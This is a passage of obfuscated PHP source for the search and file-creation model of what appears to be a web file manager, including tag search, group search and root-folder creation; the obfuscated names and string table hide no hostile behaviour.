$this->_listSearchTag($Ä‘–Î, $Ç½Á»˜·, $ï¬Äïçã); $this->_listSearchGroupTag($Ä‘–Î, $Ç½Á»˜·, $ï¬Äïçã); $this->_listDataApply($Ä‘–Î[$Ó†¯í[376]]); $this->_listMake($Ä‘–Î); return $Ä‘–Î; } private function _listSearchFileContent(&$†²«Ïéö, $÷”ŒÆÎº, $’óÃª³Õ, $ö¬ÍåÇÕ) { $ÕïÀè =& $_SERVER[Á÷ ­Šë]; if (!$÷”ŒÆÎº[$ÕïÀè[1833]] || $†²«Ïéö[$ÕïÀè[373]][$ÕïÀè[360]] > 1) { return; } if (!isset($ö¬ÍåÇÕ[$ÕïÀè[28]]) || !is_array($÷”ŒÆÎº[$ÕïÀè[471]])) { return; } $ö¬ÍåÇÕ[$ÕïÀè[471]] = array($ÕïÀè[7], $÷”ŒÆÎº[$ÕïÀè[471]]); unset($ö¬ÍåÇÕ[$ÕïÀè[28]]); unset($÷”ŒÆÎº[$ÕïÀè[471]]); $Ê³îàæƒ = $this->field($’óÃª³Õ)->where($ö¬ÍåÇÕ)->limit($ÕïÀè[1991])->select(); if (!$Ê³îàæƒ || count($Ê³îàæƒ) == 0) { return; } $†²«Ïéö[$ÕïÀè[376]] = array_merge($Ê³îàæƒ, $†²«Ïéö[$ÕïÀè[376]]); $†²«Ïéö[$ÕïÀè[373]][$ÕïÀè[374]] += count($Ê³îàæƒ); } private function _listSearchTag(&$‹±éÅä, $ç­ğıê‡, $ºÄ×¾Šø) { $¨ÈÑÖ¬‘ =& $_SERVER[Á÷ ­Šë]; if (!$ç­ğıê‡[$¨ÈÑÖ¬‘[1833]] || $‹±éÅä[$¨ÈÑÖ¬‘[373]][$¨ÈÑÖ¬‘[360]] > 1) { return; } $á—è¡ = Model($¨ÈÑÖ¬‘[1992])->listData(); $ŞúÍÁ = array(); $ÓØÚÛÛô = $ç­ğıê‡[$¨ÈÑÖ¬‘[1833]]; foreach ($á—è¡ as $ùÔ×¸˜Æ) { $¡â½” = $ùÔ×¸˜Æ[$¨ÈÑÖ¬‘[28]]; $˜ñïÒº = str_replace($¨ÈÑÖ¬‘[50], $¨ÈÑÖ¬‘[33], Pinyin::get($¡â½”)); if (stripos($¡â½”, $ÓØÚÛÛô) !== !1 || stripos($˜ñïÒº, $ÓØÚÛÛô) !== !1) { $ŞúÍÁ[] = $ùÔ×¸˜Æ[$¨ÈÑÖ¬‘[404]]; } } if (!$ŞúÍÁ) { return; } $Ëû÷û­œ = array($¨ÈÑÖ¬‘[431] => array($¨ÈÑÖ¬‘[7], $ŞúÍÁ), $¨ÈÑÖ¬‘[1574] => USER_ID); $•Ÿ˜Šæ = Model($¨ÈÑÖ¬‘[432])->field($¨ÈÑÖ¬‘[86])->where($Ëû÷û­œ)->select(); $•Ÿ˜Šæ = array_to_keyvalue($•Ÿ˜Šæ, $¨ÈÑÖ¬‘[33], $¨ÈÑÖ¬‘[86]); $¼Ë²à¾º = array_unique($•Ÿ˜Šæ); $this->_listSearchMerge($‹±éÅä, $ç­ğıê‡, $ºÄ×¾Šø, $¼Ë²à¾º); } private function _listSearchDesc(&$Ï¯å½ËÕ, $™¯ØÊ½Ä, $ëá‚Ñì‘) { $¯ù“šß =& $_SERVER[Á÷ ­Šë]; if (!$™¯ØÊ½Ä[$¯ù“šß[1833]] || $Ï¯å½ËÕ[$¯ù“šß[373]][$¯ù“šß[360]] > 1) { return; } $ûàêøäå = $this->listSearchChildren($™¯ØÊ½Ä[$¯ù“šß[502]]); $ûàêøäå = array_unique($ûàêøäå); if (!$ûàêøäå) { return; } $›ŸóÜ­ = array($¯ù“šß[407] => array($¯ù“šß[7], $ûàêøäå), $¯ù“šß[103] => $¯ù“šß[455], $¯ù“šß[381] => array($¯ù“šß[390], $¯ù“šß[1835] . $™¯ØÊ½Ä[$¯ù“šß[1833]] . $¯ù“šß[1835])); $§£ƒ®ëş = Model($¯ù“šß[567])->field($¯ù“šß[407])->where($›ŸóÜ­)->select(); $Ï§Ü½ƒ = array_to_keyvalue($§£ƒ®ëş, $¯ù“šß[33], $¯ù“šß[407]); $this->_listSearchMerge($Ï¯å½ËÕ, $™¯ØÊ½Ä, $ëá‚Ñì‘, $Ï§Ü½ƒ); } private function _listSearchGroupTag(&$ ´ƒİ¢”, $é†ÔÑ¾Š, $¾Ü‚ÀîË) { $Ï»œàÁá =& $_SERVER[Á÷ ­Šë]; if (!$é†ÔÑ¾Š[$Ï»œàÁá[1833]] || $ ´ƒİ¢”[$Ï»œàÁá[373]][$Ï»œàÁá[360]] > 1 || !$é†ÔÑ¾Š[$Ï»œàÁá[502]]) { return; } $àĞ†™¼ô = $this->sourceInfo($é†ÔÑ¾Š[$Ï»œàÁá[502]]); if (!$àĞ†™¼ô || $àĞ†™¼ô[$Ï»œàÁá[416]] != SourceModel::TYPE_GROUP) { return; } $§³Ô‚ˆ¬ = $àĞ†™¼ô[$Ï»œàÁá[508]]; $©šÈŞü‘ = Model($Ï»œàÁá[1993])->get($§³Ô‚ˆ¬); $óÎ¨à¯÷ = array(); $§‚‡ìÈ = $é†ÔÑ¾Š[$Ï»œàÁá[1833]]; foreach ($©šÈŞü‘[$Ï»œàÁá[376]] as $•Ê¸ÖßŒ) { $Î¤ÄŸğÆ = $•Ê¸ÖßŒ[$Ï»œàÁá[28]]; $½—ÜÅÚÓ = str_replace($Ï»œàÁá[50], $Ï»œàÁá[33], Pinyin::get($Î¤ÄŸğÆ)); if (stripos($Î¤ÄŸğÆ, $§‚‡ìÈ) !== !1 || stripos($½—ÜÅÚÓ, $§‚‡ìÈ) !== !1) { $óÎ¨à¯÷[] = $•Ê¸ÖßŒ[$Ï»œàÁá[404]]; } } if (!$óÎ¨à¯÷) { return; } $•ï‰³ã = array($Ï»œàÁá[431] => array($Ï»œàÁá[7], $óÎ¨à¯÷), $Ï»œàÁá[1574] => 0, $Ï»œàÁá[29] => $Ï»œàÁá[1857] . $§³Ô‚ˆ¬); $™ø Èí‹ = Model($Ï»œàÁá[432])->field($Ï»œàÁá[86])->where($•ï‰³ã)->select(); $™ø Èí‹ = array_to_keyvalue($™ø Èí‹, $Ï»œàÁá[33], $Ï»œàÁá[86]); $„ÃÊùßì = array_unique($™ø Èí‹); $this->_listSearchMerge($ ´ƒİ¢”, $é†ÔÑ¾Š, $¾Ü‚ÀîË, $„ÃÊùßì); } private function _listSearchMerge(&$‰Œ€õÕå, $è–¸ÑÒÊ, $©ÖµüİÄ, $ôãª¯¹Â) { $íËîî‰’ =& $_SERVER[Á÷ ­Šë]; if (!$ôãª¯¹Â) { return; } $ö÷¹ñéä = array_to_keyvalue($‰Œ€õÕå[$íËîî‰’[376]], $íËîî‰’[33], $íËîî‰’[407]); $íËÙÖ§É = array_diff($ôãª¯¹Â, $ö÷¹ñéä); if (!$íËÙÖ§É) { return; } $îÆ§‘„ = array($íËîî‰’[407] => array($íËîî‰’[7], $íËÙÖ§É)); $İ—€½¬ê = $this->field($©ÖµüİÄ)->where($îÆ§‘„)->select(); if (!$İ—€½¬ê) { return; } $İ´Ûó = array(); foreach ($İ—€½¬ê as $ğ‰ÅÑ ) { if ($this->_listSearchFilter($ğ‰ÅÑ , $è–¸ÑÒÊ)) { $İ´Ûó[] = $ğ‰ÅÑ ; } } $‰Œ€õÕå[$íËîî‰’[376]] = array_merge($İ´Ûó, $‰Œ€õÕå[$íËîî‰’[376]]); $‰Œ€õÕå[$íËîî‰’[373]][$íËîî‰’[374]] += count($İ´Ûó); } private function _listSearchFilter($ÚË®ëˆë, $şñ¥©ŞŸ) { $¬şığÜ =& $_SERVER[Á÷ ­Šë]; $¸Ó¬ŞòÏ = $ÚË®ëˆë[$¬şığÜ[415]] == $¬şığÜ[97]; if (!strstr($ÚË®ëˆë[$¬şığÜ[525]], $¬şığÜ[47] . $şñ¥©ŞŸ[$¬şığÜ[502]] . $¬şığÜ[47])) { return !1; } if (isset($şñ¥©ŞŸ[$¬şığÜ[417]]) && $şñ¥©ŞŸ[$¬şığÜ[417]] != $¬şığÜ[1796]) { if ($şñ¥©ŞŸ[$¬şığÜ[417]] == $¬şığÜ[87] && !$¸Ó¬ŞòÏ) { return !1; } if ($şñ¥©ŞŸ[$¬şığÜ[417]] != $¬şığÜ[87] && $¸Ó¬ŞòÏ) { return !1; } if (!strstr($ÚË®ëˆë[$¬şığÜ[178]], $¬şığÜ[47] . $şñ¥©ŞŸ[$¬şığÜ[417]] . $¬şığÜ[47])) { return !1; } } if (isset($şñ¥©ŞŸ[$¬şığÜ[1994]]) && $şñ¥©ŞŸ[$¬şığÜ[1994]] < $ÚË®ëˆë[$¬şığÜ[88]]) { return !1; } if (isset($şñ¥©ŞŸ[$¬şığÜ[1995]]) && $şñ¥©ŞŸ[$¬şığÜ[1995]] > $ÚË®ëˆë[$¬şığÜ[88]]) { return !1; } if (isset($şñ¥©ŞŸ[$¬şığÜ[598]]) && $şñ¥©ŞŸ[$¬şığÜ[598]] != $ÚË®ëˆë[$¬şığÜ[458]]) { return !1; } return !0; } public function listSearchChildren($ ÍÄ“°Ñ, $Ãúıáğ× = 5000) { $àã´“¯Ã =& $_SERVER[Á÷ ­Šë]; $¡üÏ­–Ü = array(); $¯é§÷õ = $this->sourceInfo($ ÍÄ“°Ñ); $€ÏØîö¡ = array($àã´“¯Ã[525] => array($àã´“¯Ã[390], $¯é§÷õ[$àã´“¯Ã[525]] . $¯é§÷õ[$àã´“¯Ã[407]] . $àã´“¯Ã[549])); $âÃÊ‘ª = $this->field($àã´“¯Ã[407])->cache(null, 600)->where($€ÏØîö¡)->count(); if ($âÃÊ‘ª > $Ãúıáğ×) { return $this->_listSearchChildrenNear($ ÍÄ“°Ñ, $Ãúıáğ×); } $®Ğ¸ÌºÃ = $this->field($àã´“¯Ã[407])->where($€ÏØîö¡)->select(); $¡üÏ­–Ü = array_to_keyvalue($®Ğ¸ÌºÃ, $àã´“¯Ã[33], $àã´“¯Ã[407]); return $¡üÏ­–Ü; } private function _listSearchChildrenNear($öÛÖ°ë«, $à´“Âãê) { $ÊÂıÁçğ =& $_SERVER[Á÷ ­Šë]; $â‹Š´° = array(); $¤Ô¡·¶Ñ = array($ÊÂıÁçğ[502] => $öÛÖ°ë«); $¶ÇãÍõƒ = $this->field($ÊÂıÁçğ[1996])->where($¤Ô¡·¶Ñ)->select(); $¾ºàÇÏ¼ = array_to_keyvalue(array_filter_by_field($¶ÇãÍõƒ, $ÊÂıÁçğ[415], $ÊÂıÁçğ[97]), $ÊÂıÁçğ[33], $ÊÂıÁçğ[407]); $â‹Š´° = array_merge($â‹Š´°, array_to_keyvalue($¶ÇãÍõƒ, $ÊÂıÁçğ[33], $ÊÂıÁçğ[407])); if (!$¾ºàÇÏ¼) { return $â‹Š´°; } $¤Ô¡·¶Ñ = array($ÊÂıÁçğ[502] => array($ÊÂıÁçğ[7], $¾ºàÇÏ¼)); $¶ÇãÍõƒ = $this->field($ÊÂıÁçğ[1996])->where($¤Ô¡·¶Ñ)->limit($à´“Âãê)->select(); $â‹Š´° = array_merge($â‹Š´°, array_to_keyvalue($¶ÇãÍõƒ, $ÊÂıÁçğ[33], $ÊÂıÁçğ[407])); $â‹Š´° = array_slice($â‹Š´°, 0, $à´“Âãê); return $â‹Š´°; } private function _listSearchBindPinyin($¹ÖŒ·ª‹, &$Ğ¦Œ¹É», &$ü¹Û¾Òâ) { $ºÏëÖÅ— =& $_SERVER[Á÷ ­Šë]; if (!isset($¹ÖŒ·ª‹[$ºÏëÖÅ—[1833]]) || !$¹ÖŒ·ª‹[$ºÏëÖÅ—[1833]]) { return; } if (!Input::check($¹ÖŒ·ª‹[$ºÏëÖÅ—[1833]], $ºÏëÖÅ—[325]) || strlen($¹ÖŒ·ª‹[$ºÏëÖÅ—[1833]]) < 2) { return; } $âü×ğŠ = "\114\x45\x46\x54\40\112\117\111\116\x20{$this->tablePrefix}\151\157\x5f\x73\x6f\165\x72\x63\x65\x5f\x6d\x65\x74\x61\40\155\145\164\141\40\157\x6e\40\163\157\165\x72\x63\145\x2e\163\x6f\165\162\143\145\x49\x44\40\x3d\40\155\x65\x74\141\56\163\x6f\x75\162\x63\x65\111\x44"; $Ê¶áƒÃÄ = array(); $ü¹Û¾Òâ = str_replace(array($ºÏëÖÅ—[62], $ºÏëÖÅ—[50], $ºÏëÖÅ—[1997]), $ºÏëÖÅ—[33], $ü¹Û¾Òâ); $ü¹Û¾Òâ = $ºÏëÖÅ—[440] . str_replace($ºÏëÖÅ—[47], $ºÏëÖÅ—[441], $ü¹Û¾Òâ); $µÄúÕ—ú = $Ğ¦Œ¹É»[$ºÏëÖÅ—[28]]; unset($Ğ¦Œ¹É»[$ºÏëÖÅ—[28]]); foreach ($Ğ¦Œ¹É» as $äÃ ¦‹ => $Œ¹å‰ç) { $Ê¶áƒÃÄ[$ºÏëÖÅ—[440] . $äÃ ¦‹] = $Œ¹å‰ç; } foreach ($µÄúÕ—ú as $âàæúéÉ) { $Ê¶áƒÃÄ[] = array($ºÏëÖÅ—[445] => $âàæúéÉ, $ºÏëÖÅ—[992] => $ºÏëÖÅ—[1837], array($ºÏëÖÅ—[1998] => $âàæúéÉ, $ºÏëÖÅ—[1999] => array($ºÏëÖÅ—[7], array($ºÏëÖÅ—[468], $ºÏëÖÅ—[467])))); } $this->join($âü×ğŠ); $Ğ¦Œ¹É» = $Ê¶áƒÃÄ; } private function _parseSearchWhere($•îäª‹…) { $²¨‘¼»Ó =& $_SERVER[Á÷ ­Šë]; $Í¤ı–¦³ = array(); if (isset($•îäª‹…[$²¨‘¼»Ó[756]]) && $•îäª‹…[$²¨‘¼»Ó[756]]) { $Í¤ı–¦³[$²¨‘¼»Ó[94]] = array($²¨‘¼»Ó[2000], $•îäª‹…[$²¨‘¼»Ó[756]]); } if (isset($•îäª‹…[$²¨‘¼»Ó[500]]) && $•îäª‹…[$²¨‘¼»Ó[500]]) { $¾¡ñ«Ç¸ = array($²¨‘¼»Ó[2001], $•îäª‹…[$²¨‘¼»Ó[500]]); if ($Í¤ı–¦³[$²¨‘¼»Ó[94]]) { $Í¤ı–¦³[$²¨‘¼»Ó[94]] = array($Í¤ı–¦³[$²¨‘¼»Ó[94]], $¾¡ñ«Ç¸, $²¨‘¼»Ó[2002]); } else { $Í¤ı–¦³[$²¨‘¼»Ó[94]] = $¾¡ñ«Ç¸; } } if (isset($•îäª‹…[$²¨‘¼»Ó[1994]]) && $•îäª‹…[$²¨‘¼»Ó[1994]] > 0) { $Í¤ı–¦³[$²¨‘¼»Ó[88]] = array($²¨‘¼»Ó[2000], $•îäª‹…[$²¨‘¼»Ó[1994]]); } if (isset($•îäª‹…[$²¨‘¼»Ó[1995]]) && $•îäª‹…[$²¨‘¼»Ó[1995]]) { $¾¡ñ«Ç¸ = array($²¨‘¼»Ó[2001], $•îäª‹…[$²¨‘¼»Ó[1995]]); if ($Í¤ı–¦³[$²¨‘¼»Ó[88]]) { $Í¤ı–¦³[$²¨‘¼»Ó[88]] = array($Í¤ı–¦³[$²¨‘¼»Ó[88]], $¾¡ñ«Ç¸, $²¨‘¼»Ó[2002]); } else { $Í¤ı–¦³[$²¨‘¼»Ó[88]] = $¾¡ñ«Ç¸; } } if (isset($•îäª‹…[$²¨‘¼»Ó[598]]) && $•îäª‹…[$²¨‘¼»Ó[598]]) { $Í¤ı–¦³[] = array($²¨‘¼»Ó[458] => $•îäª‹…[$²¨‘¼»Ó[598]], $²¨‘¼»Ó[456] => $•îäª‹…[$²¨‘¼»Ó[598]], $²¨‘¼»Ó[992] => $²¨‘¼»Ó[1837]); } if (isset($•îäª‹…[$²¨‘¼»Ó[417]]) && $•îäª‹…[$²¨‘¼»Ó[417]]) { $òİ›ÓÁÁ = $•îäª‹…[$²¨‘¼»Ó[417]]; if ($òİ›ÓÁÁ == $²¨‘¼»Ó[87]) { $Í¤ı–¦³[$²¨‘¼»Ó[415]] = 1; } else { if ($òİ›ÓÁÁ == $²¨‘¼»Ó[2003]) { $Í¤ı–¦³[$²¨‘¼»Ó[415]] = 0; } else { if ($òİ›ÓÁÁ) { $òİ›ÓÁÁ = is_array($òİ›ÓÁÁ) ? $òİ›ÓÁÁ : explode($²¨‘¼»Ó[47], $òİ›ÓÁÁ); $Í¤ı–¦³[$²¨‘¼»Ó[417]] = array($²¨‘¼»Ó[423], $òİ›ÓÁÁ); $Í¤ı–¦³[$²¨‘¼»Ó[415]] = 0; } } } } $this->_parseSearchParent($•îäª‹…, $Í¤ı–¦³); if (isset($•îäª‹…[$²¨‘¼»Ó[1833]]) && trim($•îäª‹…[$²¨‘¼»Ó[1833]])) { $ââîËÉö = trim($•îäª‹…[$²¨‘¼»Ó[1833]]); $“½’ì—° = explode($²¨‘¼»Ó[50], $ââîËÉö); if (strlen($ââîËÉö) > 2 && (substr($ââîËÉö, 0, 1) == $²¨‘¼»Ó[126] && substr($ââîËÉö, -1) == $²¨‘¼»Ó[126]) || substr($ââîËÉö, 0, 1) == $²¨‘¼»Ó[55] && substr($ââîËÉö, -1) == $²¨‘¼»Ó[55]) { $ââîËÉö = substr($ââîËÉö, 1, -1); $“½’ì—° = array($ââîËÉö); } $Í¤ı–¦³[$²¨‘¼»Ó[28]] = array(array($²¨‘¼»Ó[548], $²¨‘¼»Ó[1835] . $ââîËÉö . $²¨‘¼»Ó[1835])); if (count($“½’ì—°) > 1) { $Í¤ı–¦³[$²¨‘¼»Ó[28]] = array(); foreach ($“½’ì—° as $¦ƒü…èÆ) { if (!trim($¦ƒü…èÆ)) { continue; } $Í¤ı–¦³[$²¨‘¼»Ó[28]][] = array($²¨‘¼»Ó[548], $²¨‘¼»Ó[1835] . trim($¦ƒü…èÆ) . $²¨‘¼»Ó[1835]); } } } return $Í¤ı–¦³; } private function _parseSearchParent($íÊûŠšÙ, &$èåˆù–) { $Õçü¦ü² =& $_SERVER[Á÷ ­Šë]; if (!isset($íÊûŠšÙ[$Õçü¦ü²[502]]) || !$íÊûŠšÙ[$Õçü¦ü²[502]]) { return; } $¢êÓåØ¢ = $this->pathInfo($íÊûŠšÙ[$Õçü¦ü²[502]]); $İ”áºêï = $¢êÓåØ¢[$Õçü¦ü²[502]] . $Õçü¦ü²[33] === $Õçü¦ü²[201]; $€¾¾²¾Ô = $¢êÓåØ¢[$Õçü¦ü²[416]] == $Õçü¦ü²[519]; $èåˆù–[$Õçü¦ü²[588]] = array($Õçü¦ü²[548], $¢êÓåØ¢[$Õçü¦ü²[525]] . $íÊûŠšÙ[$Õçü¦ü²[502]] . $Õçü¦ü²[549]); $Ì¬Ê°û¥ = isset($íÊûŠšÙ[$Õçü¦ü²[1700]]) && in_array($Õçü¦ü²[519], $íÊûŠšÙ[$Õçü¦ü²[1700]]); if (!$Ì¬Ê°û¥ || !$€¾¾²¾Ô || !$İ”áºêï || !$¢êÓåØ¢[$Õçü¦ü²[418]]) { return; } if (!AuthModel::authCheckRoot($¢êÓåØ¢[$Õçü¦ü²[418]][$Õçü¦ü²[419]])) { return; } $–ş„å¢À = $¢êÓåØ¢[$Õçü¦ü²[508]] . $Õçü¦ü²[33]; if ($–ş„å¢À == $Õçü¦ü²[97]) { unset($èåˆù–[$Õçü¦ü²[588]]); $èåˆù–[$Õçü¦ü²[416]] = self::TYPE_GROUP; return; } $àÆšİûÍ = Model($Õçü¦ü²[526])->groupChildrenAll($–ş„å¢À); $ÆËˆã˜º = count($àÆšİûÍ); if ($ÆËˆã˜º <= 1) { return; } $™‰óê = array($Õçü¦ü²[502] => 0, $Õçü¦ü²[416] => self::TYPE_GROUP, $Õçü¦ü²[508] => array($Õçü¦ü²[7], $àÆšİûÍ)); $ÒƒïÇÖ = $this->field($Õçü¦ü²[2004])->where($™‰óê)->limit($ÆËˆã˜º)->select(); $èåˆù–[$Õçü¦ü²[588]] = array(); foreach ($ÒƒïÇÖ as $¼ŠñÇ«º) { $èåˆù–[$Õçü¦ü²[588]][] = array($Õçü¦ü²[548], $Õçü¦ü²[535] . $¼ŠñÇ«º[$Õçü¦ü²[407]] . $Õçü¦ü²[549]); } $èåˆù–[$Õçü¦ü²[588]][] = $Õçü¦ü²[1837]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($æçŒ£ïÆ) { $–è³¦®Ã =& $_SERVER[Á÷ ­Šë]; $–¬¦ªİ» = Model($–è³¦®Ã[517])->where(array($–è³¦®Ã[1565] => $æçŒ£ïÆ))->find(); $†­Ğ“Æ÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $æçŒ£ïÆ, $–¬¦ªİ»[$–è³¦®Ã[28]]); $this->userDesktopAdd($†­Ğ“Æ÷); return $†­Ğ“Æ÷; } public function userDesktopAdd($±³êÕ€) { $Úúá”òğ =& $_SERVER[Á÷ ­Šë]; $Íè ±…Î = LNG($Úúá”òğ[2005]); $¡àı‡Æ = $this->mkdir($±³êÕ€, $Íè ±…Î); $this->metaSet($¡àı‡Æ, $Úúá”òğ[2006], $Úúá”òğ[97]); $this->metaSet($±³êÕ€, $Úúá”òğ[2007], $¡àı‡Æ); } public function groupRootAdd($¸ß¥§•½) { $×”ìÊÄÚ =& $_SERVER[Á÷ ­Šë]; $µøäĞĞ = Model($×”ìÊÄÚ[526])->where(array($×”ìÊÄÚ[1829] => $¸ß¥§•½))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¸ß¥§•½, $µøäĞĞ[$×”ìÊÄÚ[28]]); } public function systemRootPathAdd($˜§öÙÍ“) { if ($˜§öÙÍ“ != $_SERVER[Á÷ ­Šë][541]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $˜§öÙÍ“); } public function userRootRemove($”æ×¿¸®) { $ÖûÛô™½ = $this->sourceRoot(SourceModel::TYPE_USER, $”æ×¿¸®); if (!$ÖûÛô™½) { return; } $this->remove($ÖûÛô™½, !1); } public function groupRootRemove($œ¡¦¸”Ğ) { $øˆªŸ Í = $this->sourceRoot(SourceModel::TYPE_GROUP, $œ¡¦¸”Ğ); if (!$øˆªŸ Í) { return; } $this->remove($øˆªŸ Í, !1); } private function _mkdirRoot($ôÒÏÒ, $Úáâññ‹, $ÓÇÄÁ—Ş) { $µ¹ñ¹¾ =& $_SERVER[Á÷ ­Šë]; $†àÖœÕ = array($µ¹ñ¹¾[406] => 0, $µ¹ñ¹¾[584] => $ôÒÏÒ, $µ¹ñ¹¾[585] => $Úáâññ‹, $µ¹ñ¹¾[581] => 1, $µ¹ñ¹¾[586] => USER_ID, $µ¹ñ¹¾[587] => USER_ID, $µ¹ñ¹¾[582] => $µ¹ñ¹¾[33], $µ¹ñ¹¾[588] => $µ¹ñ¹¾[535], $µ¹ñ¹¾[434] => 0, $µ¹ñ¹¾[583] => 0, $µ¹ñ¹¾[472] => 0, $µ¹ñ¹¾[589] => $µ¹ñ¹¾[33]); if ($±ƒŸ‰×¡ = $this->where($†àÖœÕ)->find()) { return $±ƒŸ‰×¡[$µ¹ñ¹¾[407]]; } $¾¡®¸¦ = "\115\x6f\x64\145\x6c\123\x6f\x75\162\143\145\56\155\153\144\151\162\122\157\x6f\164\x2e{$ôÒÏÒ}\x2e{$Úáâññ‹}\x2e" . $ÓÇÄÁ—Ş; CacheLock::lock($¾¡®¸¦); $†àÖœÕ[$µ¹ñ¹¾[28]] = $ÓÇÄÁ—Ş; $¦›«ÖÊ¯ = $this->add($†àÖœÕ); $Á˜•ñä = array($µ¹ñ¹¾[590] => short_id($¦›«ÖÊ¯)); $this->where(array($µ¹ñ¹¾[422] => $¦›«ÖÊ¯))->save($Á˜•ñä); CacheLock::unlock($¾¡®¸¦); return $¦›«ÖÊ¯; } private function sourceRoot($™®óïš, $ª½ÒØÉÙ, $¾ª¥äãğ = false) { $î¹ääêÔ =& $_SERVER[Á÷ ­Šë]; $„øÇâ’Ã = array($î¹ääêÔ[406] => 0, $î¹ääêÔ[584] => $™®óïš, $î¹ääêÔ[585] => $ª½ÒØÉÙ); if ($ÀÙÈ İÊ = $this->where($„øÇâ’Ã)->find()) { return $¾ª¥äãğ ? $ÀÙÈ İÊ : $ÀÙÈ İÊ[$î¹ääêÔ[407]]; } return !1; } public function sourceRootGroup($ÒÑÀ¼Ûœ) { $À¬î¿² =& $_SERVER[Á÷ ­Šë]; if (is_string($ÒÑÀ¼Ûœ)) { $ÒÑÀ¼Ûœ = array($ÒÑÀ¼Ûœ); } $Ù¯±øí÷ = array($À¬î¿²[406] => 0, $À¬î¿²[585] => array($À¬î¿²[7], $ÒÑÀ¼Ûœ), $À¬î¿²[584] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $¦òø‡Ù£ = $this->limit(count($ÒÑÀ¼Ûœ))->listSource($Ù¯±øí÷, 1000); $this->selectPageRestore(); return array_to_keyvalue($¦òø‡Ù£[$À¬î¿²[85]], $À¬î¿²[508]); } public function mkfile($îÉşÚ¿Á, $ëÆÒ‰ï, $ĞäªÉïÙ = '', $ä’Š¯Ù = REPEAT_RENAME) { $»‚ïêÔ =& $_SERVER[Á÷ ­Šë]; $ùÎ´¤½¦ = Model($»‚ïêÔ[607])->addFileByContent($ĞäªÉïÙ, $ëÆÒ‰ï); return $this->_createFileCall($îÉşÚ¿Á, $ëÆÒ‰ï, $ùÎ´¤½¦, $ä’Š¯Ù, $»‚ïêÔ[1260]); } public function addFile($“´¼ÙÁ, $Õ€¬‡ü“, $á¤ ×Œ©, $·’ƒÉÔï = false, $ ¡í‰ú÷ = REPEAT_RENAME) { $†Ù–õˆÜ = Model($_SERVER[Á÷ ­Šë][607])->addFile($Õ€¬‡ü“, $á¤ ×Œ©, $·’ƒÉÔï); return $this->_createFileCall($“´¼ÙÁ, $á¤ ×Œ©, $†Ù–õˆÜ, $ ¡í‰ú÷); } public function addFileByFileID($àÆşĞ±Ó, $‘ñ…çâÕ, $…æ¢ïıë, $Áã¢ªä¾ = REPEAT_RENAME) { $¤¿ù½½‚ =& $_SERVER[Á÷ ­Šë]; $÷¡Ñ³Ö = Model($¤¿ù½½‚[607])->find($‘ñ…çâÕ); Model($¤¿ù½½‚[607])->linkAdd($‘ñ…çâÕ); return $this->_createFileCall($àÆşĞ±Ó, $…æ¢ïıë, $÷¡Ñ³Ö, $Áã¢ªä¾); } public function addFileByRemote($°ß„˜ş, $§İ» ˜º, $‡àıñ¼Õ, $ô£Ê¿¶ø = array(), $Œè“ûò¼ = REPEAT_RENAME) { $–¶€Îºˆ = Model($_SERVER[Á÷ ­Šë][607])->addFileByRemote($§İ» ˜º, $‡àıñ¼Õ, $ô£Ê¿¶ø); return $this->_createFileCall($°ß„˜ş, $‡àıñ¼Õ, $–¶€Îºˆ, $Œè“ûò¼); } private function _createFileCall($ôƒ¦È’Ë, $µ›–‚˜Í, $ù×ÁÛ·š, $‚˜•¨úô, $àçĞ€õ = "\x75\160\x6c\x6f\141\144") { $ÍĞèÓº =& $_SERVER[Á÷ ­Šë]; $¨ê·¤¨ = !1; $this->setMasterDB(); $this->lockWriteStart($ôƒ¦È’Ë, $µ›–‚˜Í); $›ù³²ÅÔ = $this->fileNameExist($ôƒ¦È’Ë, $µ›–‚˜Í); $‹¿Ğ¼Şø = $this->_createFile($ôƒ¦È’Ë, $µ›–‚˜Í, $ù×ÁÛ·š, $‚˜•¨úô, $¨ê·¤¨); if (!$¨ê·¤¨) { Model($ÍĞèÓº[474])->remove($ù×ÁÛ·š[$ÍĞèÓº[471]]); } if ($¨ê·¤¨ && $‹¿Ğ¼Şø && $‹¿Ğ¼Şø != $›ù³²ÅÔ) { Model($ÍĞèÓº[1978])->eventCreate($‹¿Ğ¼Şø, $àçĞ€õ); } $this->lockWriteEnd($ôƒ¦È’Ë, $µ›–‚˜Í); return $‹¿Ğ¼Şø; } public function mkdir($ö–Ğ”•², $œäˆŸÚƒ, $¢†¸ˆô = REPEAT_SKIP) { $²ş¿™Ğ¶ =& $_SERVER[Á÷ ­Šë]; $this->setMasterDB(); $¶±‚ú½Õ = $this->sourceInfo($ö–Ğ”•²); if (!$¶±‚ú½Õ) { return !1; } $this->lockWriteStart($ö–Ğ”•², $œäˆŸÚƒ); if ($¢†¸ˆô !== !1) { $×¥İˆôÀ = $this->fileNameExist($ö–Ğ”•², $œäˆŸÚƒ); if ($×¥İˆôÀ && $¢†¸ˆô != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ö–Ğ”•², $œäˆŸÚƒ); return $×¥İˆôÀ; } $œäˆŸÚƒ = $this->fileNameAuto($ö–Ğ”•², $œäˆŸÚƒ, $¢†¸ˆô); } $¥«Ë®ûÍ = array($²ş¿™Ğ¶[581] => 1, $²ş¿™Ğ¶[425] => $œäˆŸÚƒ, $²ş¿™Ğ¶[582] => $²ş¿™Ğ¶[33], $²ş¿™Ğ¶[472] => 0, $²ş¿™Ğ¶[583] => 0); $á™åº˜ = $this->_addSource($¥«Ë®ûÍ, $¶±‚ú½Õ); Model($²ş¿™Ğ¶[1978])->eventCreate($á™åº˜, $²ş¿™Ğ¶[1261]); $this->lockWriteEnd($ö–Ğ”•², $œäˆŸÚƒ); return $á™åº˜; } private function _createFile($ü†²—èú, $“§µ³¹, $Â‹ØÓ¢, $å«Â…—», &$˜ñ¨ù®‰) { $óåûüŸ÷ =& $_SERVER[Á÷ ­Šë]; $ğõó¹¼µ = $this->sourceInfo($ü†²—èú); if (!$Â‹ØÓ¢ || !$ğõó¹¼µ) { return !1; } if ($å«Â…—» !== !1) { $ÔÃß‡ = $this->fileNameExist($ü†²—èú, $“§µ³¹); } $˜ñ¨ù®‰ = !0; if ($å«Â…—» && $ÔÃß‡) { if ($å«Â…—» == REPEAT_SKIP) { $˜ñ¨ù®‰ = !1; return $ÔÃß‡; } else { if ($å«Â…—» == REPEAT_REPLACE) { 